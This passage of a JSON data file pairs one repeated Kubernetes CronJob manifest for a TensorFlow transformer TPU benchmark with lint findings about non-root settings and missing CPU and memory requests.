{\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"exp_per_second\\\": {\\n\\\n              \\    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 3\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   },\\n   \\\"startup_time\\\": {\\n    \\\"comparison\\\": \\\"less\\\",\\n\\\n              \\    \\\"success_threshold\\\": {\\n     \\\"stddevs_from_mean\\\": 4\\n    },\\n\\\n              \\    \\\"wait_for_n_points_of_history\\\": 10\\n   }\\n  }\\n },\\n \\\"test_name\\\"\\\n              : \\\"tf-nightly-transformer-perfzero-v3-32\\\"\\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"monitor\" is not set to runAsNonRoot"
  },
  {
    "id": "7482",
    "manifest_path": "data/manifests/the_stack_sample/sample_2734.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  labels:\n    accelerator: v3-32\n    benchmarkId: tf-nightly-transformer-perfzero-v3-32\n    frameworkVersion: tf-nightly\n    mode: perfzero\n    model: transformer\n  name: tf-nightly-transformer-perfzero-v3-32\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          reserved.cloud-tpus.google.com: 'false'\n          tf-version.cloud-tpus.google.com: nightly\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - /bin/bash\n          - -c\n          - \"set -u\\nset -e\\nset -x\\n\\nsed -i 's_gs://tf-perfzero-data/bert_$(PERFZERO_DATA_DIR)_g'\\\n            \\ /garden/official/benchmark/bert_squad_benchmark.py\\nsed -i 's_gs://tf-perfzero-data_$(PERFZERO_DATA_DIR)_g'\\\n            \\ /garden/official/benchmark/retinanet_benchmark.py\\nsed -i 's_gs://mlcompass-data/transformer_$(PERFZERO_DATA_DIR)_g'\\\n            \\ /garden/official/benchmark/transformer_benchmark.py\\nsed -i 's_gs://mlcompass-data/imagenet/imagenet-2012-tfrecord_$(PERFZERO_DATA_DIR)/imagenet_g'\\\n            \\ /garden/official/benchmark/resnet_ctl_imagenet_benchmark.py\\nsed -i\\\n            \\ 's/wmt32k-en2de-official/transformer/g' /garden/official/benchmark/transformer_benchmark.py\\n\\\n            \\nif [ -v TPU_NAME ]; then\\n  export BENCHMARK_TPU=${TPU_NAME#*/}\\nfi\\n\\\n            \\npython3 /benchmarks/perfzero/lib/benchmark.py --gcloud_key_file= --bigquery_project_name=xl-ml-test\\\n            \\ --bigquery_dataset_table_name=perfzero_dataset.perfzero_table --benchmark_methods=official.benchmark.transformer_benchmark.TransformerBigKerasBenchmarkReal.benchmark_4x4_tpu\\\n            \\ --output_gcs_url=$(MODEL_DIR) --root_data_dir=$(PERFZERO_DATA_DIR)\\n\"\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/transformer/perfzero/v3-32/$(JOB_NAME)\n          - name: BENCHMARK_OUTPUT_DIR\n            value: $(MODEL_DIR)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:nightly\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/v3: 32\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/transformer/perfzero/v3-32/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"exp_per_second\\\": {\\n\\\n              \\    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 3\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   },\\n   \\\"startup_time\\\": {\\n    \\\"comparison\\\": \\\"less\\\",\\n\\\n              \\    \\\"success_threshold\\\": {\\n     \\\"stddevs_from_mean\\\": 4\\n    },\\n\\\n              \\    \\\"wait_for_n_points_of_history\\\": 10\\n   }\\n  }\\n },\\n \\\"test_name\\\"\\\n              : \\\"tf-nightly-transformer-perfzero-v3-32\\\"\\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"publisher\" is not set to runAsNonRoot"
  },
  {
    "id": "7483",
    "manifest_path": "data/manifests/the_stack_sample/sample_2734.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  labels:\n    accelerator: v3-32\n    benchmarkId: tf-nightly-transformer-perfzero-v3-32\n    frameworkVersion: tf-nightly\n    mode: perfzero\n    model: transformer\n  name: tf-nightly-transformer-perfzero-v3-32\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          reserved.cloud-tpus.google.com: 'false'\n          tf-version.cloud-tpus.google.com: nightly\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - /bin/bash\n          - -c\n          - \"set -u\\nset -e\\nset -x\\n\\nsed -i 's_gs://tf-perfzero-data/bert_$(PERFZERO_DATA_DIR)_g'\\\n            \\ /garden/official/benchmark/bert_squad_benchmark.py\\nsed -i 's_gs://tf-perfzero-data_$(PERFZERO_DATA_DIR)_g'\\\n            \\ /garden/official/benchmark/retinanet_benchmark.py\\nsed -i 's_gs://mlcompass-data/transformer_$(PERFZERO_DATA_DIR)_g'\\\n            \\ /garden/official/benchmark/transformer_benchmark.py\\nsed -i 's_gs://mlcompass-data/imagenet/imagenet-2012-tfrecord_$(PERFZERO_DATA_DIR)/imagenet_g'\\\n            \\ /garden/official/benchmark/resnet_ctl_imagenet_benchmark.py\\nsed -i\\\n            \\ 's/wmt32k-en2de-official/transformer/g' /garden/official/benchmark/transformer_benchmark.py\\n\\\n            \\nif [ -v TPU_NAME ]; then\\n  export BENCHMARK_TPU=${TPU_NAME#*/}\\nfi\\n\\\n            \\npython3 /benchmarks/perfzero/lib/benchmark.py --gcloud_key_file= --bigquery_project_name=xl-ml-test\\\n            \\ --bigquery_dataset_table_name=perfzero_dataset.perfzero_table --benchmark_methods=official.benchmark.transformer_benchmark.TransformerBigKerasBenchmarkReal.benchmark_4x4_tpu\\\n            \\ --output_gcs_url=$(MODEL_DIR) --root_data_dir=$(PERFZERO_DATA_DIR)\\n\"\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/transformer/perfzero/v3-32/$(JOB_NAME)\n          - name: BENCHMARK_OUTPUT_DIR\n            value: $(MODEL_DIR)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:nightly\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/v3: 32\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/transformer/perfzero/v3-32/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"exp_per_second\\\": {\\n\\\n              \\    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 3\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   },\\n   \\\"startup_time\\\": {\\n    \\\"comparison\\\": \\\"less\\\",\\n\\\n              \\    \\\"success_threshold\\\": {\\n     \\\"stddevs_from_mean\\\": 4\\n    },\\n\\\n              \\    \\\"wait_for_n_points_of_history\\\": 10\\n   }\\n  }\\n },\\n \\\"test_name\\\"\\\n              : \\\"tf-nightly-transformer-perfzero-v3-32\\\"\\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"train\" is not set to runAsNonRoot"
  },
  {
    "id": "7484",
    "manifest_path": "data/manifests/the_stack_sample/sample_2734.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  labels:\n    accelerator: v3-32\n    benchmarkId: tf-nightly-transformer-perfzero-v3-32\n    frameworkVersion: tf-nightly\n    mode: perfzero\n    model: transformer\n  name: tf-nightly-transformer-perfzero-v3-32\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          reserved.cloud-tpus.google.com: 'false'\n          tf-version.cloud-tpus.google.com: nightly\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - /bin/bash\n          - -c\n          - \"set -u\\nset -e\\nset -x\\n\\nsed -i 's_gs://tf-perfzero-data/bert_$(PERFZERO_DATA_DIR)_g'\\\n            \\ /garden/official/benchmark/bert_squad_benchmark.py\\nsed -i 's_gs://tf-perfzero-data_$(PERFZERO_DATA_DIR)_g'\\\n            \\ /garden/official/benchmark/retinanet_benchmark.py\\nsed -i 's_gs://mlcompass-data/transformer_$(PERFZERO_DATA_DIR)_g'\\\n            \\ /garden/official/benchmark/transformer_benchmark.py\\nsed -i 's_gs://mlcompass-data/imagenet/imagenet-2012-tfrecord_$(PERFZERO_DATA_DIR)/imagenet_g'\\\n            \\ /garden/official/benchmark/resnet_ctl_imagenet_benchmark.py\\nsed -i\\\n            \\ 's/wmt32k-en2de-official/transformer/g' /garden/official/benchmark/transformer_benchmark.py\\n\\\n            \\nif [ -v TPU_NAME ]; then\\n  export BENCHMARK_TPU=${TPU_NAME#*/}\\nfi\\n\\\n            \\npython3 /benchmarks/perfzero/lib/benchmark.py --gcloud_key_file= --bigquery_project_name=xl-ml-test\\\n            \\ --bigquery_dataset_table_name=perfzero_dataset.perfzero_table --benchmark_methods=official.benchmark.transformer_benchmark.TransformerBigKerasBenchmarkReal.benchmark_4x4_tpu\\\n            \\ --output_gcs_url=$(MODEL_DIR) --root_data_dir=$(PERFZERO_DATA_DIR)\\n\"\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/transformer/perfzero/v3-32/$(JOB_NAME)\n          - name: BENCHMARK_OUTPUT_DIR\n            value: $(MODEL_DIR)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:nightly\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/v3: 32\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/transformer/perfzero/v3-32/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"exp_per_second\\\": {\\n\\\n              \\    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 3\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   },\\n   \\\"startup_time\\\": {\\n    \\\"comparison\\\": \\\"less\\\",\\n\\\n              \\    \\\"success_threshold\\\": {\\n     \\\"stddevs_from_mean\\\": 4\\n    },\\n\\\n              \\    \\\"wait_for_n_points_of_history\\\": 10\\n   }\\n  }\\n },\\n \\\"test_name\\\"\\\n              : \\\"tf-nightly-transformer-perfzero-v3-32\\\"\\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"monitor\" has cpu request 0"
  },
  {
    "id": "7485",
    "manifest_path": "data/manifests/the_stack_sample/sample_2734.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  labels:\n    accelerator: v3-32\n    benchmarkId: tf-nightly-transformer-perfzero-v3-32\n    frameworkVersion: tf-nightly\n    mode: perfzero\n    model: transformer\n  name: tf-nightly-transformer-perfzero-v3-32\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          reserved.cloud-tpus.google.com: 'false'\n          tf-version.cloud-tpus.google.com: nightly\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - /bin/bash\n          - -c\n          - \"set -u\\nset -e\\nset -x\\n\\nsed -i 's_gs://tf-perfzero-data/bert_$(PERFZERO_DATA_DIR)_g'\\\n            \\ /garden/official/benchmark/bert_squad_benchmark.py\\nsed -i 's_gs://tf-perfzero-data_$(PERFZERO_DATA_DIR)_g'\\\n            \\ /garden/official/benchmark/retinanet_benchmark.py\\nsed -i 's_gs://mlcompass-data/transformer_$(PERFZERO_DATA_DIR)_g'\\\n            \\ /garden/official/benchmark/transformer_benchmark.py\\nsed -i 's_gs://mlcompass-data/imagenet/imagenet-2012-tfrecord_$(PERFZERO_DATA_DIR)/imagenet_g'\\\n            \\ /garden/official/benchmark/resnet_ctl_imagenet_benchmark.py\\nsed -i\\\n            \\ 's/wmt32k-en2de-official/transformer/g' /garden/official/benchmark/transformer_benchmark.py\\n\\\n            \\nif [ -v TPU_NAME ]; then\\n  export BENCHMARK_TPU=${TPU_NAME#*/}\\nfi\\n\\\n            \\npython3 /benchmarks/perfzero/lib/benchmark.py --gcloud_key_file= --bigquery_project_name=xl-ml-test\\\n            \\ --bigquery_dataset_table_name=perfzero_dataset.perfzero_table --benchmark_methods=official.benchmark.transformer_benchmark.TransformerBigKerasBenchmarkReal.benchmark_4x4_tpu\\\n            \\ --output_gcs_url=$(MODEL_DIR) --root_data_dir=$(PERFZERO_DATA_DIR)\\n\"\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/transformer/perfzero/v3-32/$(JOB_NAME)\n          - name: BENCHMARK_OUTPUT_DIR\n            value: $(MODEL_DIR)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:nightly\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/v3: 32\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/transformer/perfzero/v3-32/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"exp_per_second\\\": {\\n\\\n              \\    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 3\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   },\\n   \\\"startup_time\\\": {\\n    \\\"comparison\\\": \\\"less\\\",\\n\\\n              \\    \\\"success_threshold\\\": {\\n     \\\"stddevs_from_mean\\\": 4\\n    },\\n\\\n              \\    \\\"wait_for_n_points_of_history\\\": 10\\n   }\\n  }\\n },\\n \\\"test_name\\\"\\\n              : \\\"tf-nightly-transformer-perfzero-v3-32\\\"\\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"publisher\" has cpu request 0"
  },
  {
    "id": "7486",
    "manifest_path": "data/manifests/the_stack_sample/sample_2734.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  labels:\n    accelerator: v3-32\n    benchmarkId: tf-nightly-transformer-perfzero-v3-32\n    frameworkVersion: tf-nightly\n    mode: perfzero\n    model: transformer\n  name: tf-nightly-transformer-perfzero-v3-32\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          reserved.cloud-tpus.google.com: 'false'\n          tf-version.cloud-tpus.google.com: nightly\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - /bin/bash\n          - -c\n          - \"set -u\\nset -e\\nset -x\\n\\nsed -i 's_gs://tf-perfzero-data/bert_$(PERFZERO_DATA_DIR)_g'\\\n            \\ /garden/official/benchmark/bert_squad_benchmark.py\\nsed -i 's_gs://tf-perfzero-data_$(PERFZERO_DATA_DIR)_g'\\\n            \\ /garden/official/benchmark/retinanet_benchmark.py\\nsed -i 's_gs://mlcompass-data/transformer_$(PERFZERO_DATA_DIR)_g'\\\n            \\ /garden/official/benchmark/transformer_benchmark.py\\nsed -i 's_gs://mlcompass-data/imagenet/imagenet-2012-tfrecord_$(PERFZERO_DATA_DIR)/imagenet_g'\\\n            \\ /garden/official/benchmark/resnet_ctl_imagenet_benchmark.py\\nsed -i\\\n            \\ 's/wmt32k-en2de-official/transformer/g' /garden/official/benchmark/transformer_benchmark.py\\n\\\n            \\nif [ -v TPU_NAME ]; then\\n  export BENCHMARK_TPU=${TPU_NAME#*/}\\nfi\\n\\\n            \\npython3 /benchmarks/perfzero/lib/benchmark.py --gcloud_key_file= --bigquery_project_name=xl-ml-test\\\n            \\ --bigquery_dataset_table_name=perfzero_dataset.perfzero_table --benchmark_methods=official.benchmark.transformer_benchmark.TransformerBigKerasBenchmarkReal.benchmark_4x4_tpu\\\n            \\ --output_gcs_url=$(MODEL_DIR) --root_data_dir=$(PERFZERO_DATA_DIR)\\n\"\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/transformer/perfzero/v3-32/$(JOB_NAME)\n          - name: BENCHMARK_OUTPUT_DIR\n            value: $(MODEL_DIR)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:nightly\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/v3: 32\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/transformer/perfzero/v3-32/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"exp_per_second\\\": {\\n\\\n              \\    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 3\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   },\\n   \\\"startup_time\\\": {\\n    \\\"comparison\\\": \\\"less\\\",\\n\\\n              \\    \\\"success_threshold\\\": {\\n     \\\"stddevs_from_mean\\\": 4\\n    },\\n\\\n              \\    \\\"wait_for_n_points_of_history\\\": 10\\n   }\\n  }\\n },\\n \\\"test_name\\\"\\\n              : \\\"tf-nightly-transformer-perfzero-v3-32\\\"\\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"monitor\" has memory limit 0"
  },
  {
    "id": "7487",
    "manifest_path": "data/manifests/the_stack_sample/sample_2734.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  labels:\n    accelerator: v3-32\n    benchmarkId: tf-nightly-transformer-perfzero-v3-32\n    frameworkVersion: tf-nightly\n    mode: perfzero\n    model: transformer\n  name: tf-nightly-transformer-perfzero-v3-32\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          reserved.cloud-tpus.google.com: 'false'\n          tf-version.cloud-tpus.google.com: nightly\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - /bin/bash\n          - -c\n          - \"set -u\\nset -e\\nset -x\\n\\nsed -i 's_gs://tf-perfzero-data/bert_$(PERFZERO_DATA_DIR)_g'\\\n            \\ /garden/official/benchmark/bert_squad_benchmark.py\\nsed -i 's_gs://tf-perfzero-data_$(PERFZERO_DATA_DIR)_g'\\\n            \\ /garden/official/benchmark/retinanet_benchmark.py\\nsed -i 's_gs://mlcompass-data/transformer_$(PERFZERO_DATA_DIR)_g'\\\n            \\ /garden/official/benchmark/transformer_benchmark.py\\nsed -i 's_gs://mlcompass-data/imagenet/imagenet-2012-tfrecord_$(PERFZERO_DATA_DIR)/imagenet_g'\\\n            \\ /garden/official/benchmark/resnet_ctl_imagenet_benchmark.py\\nsed -i\\\n            \\ 's/wmt32k-en2de-official/transformer/g' /garden/official/benchmark/transformer_benchmark.py\\n\\\n            \\nif [ -v TPU_NAME ]; then\\n  export BENCHMARK_TPU=${TPU_NAME#*/}\\nfi\\n\\\n            \\npython3 /benchmarks/perfzero/lib/benchmark.py --gcloud_key_file= --bigquery_project_name=xl-ml-test\\\n            \\ 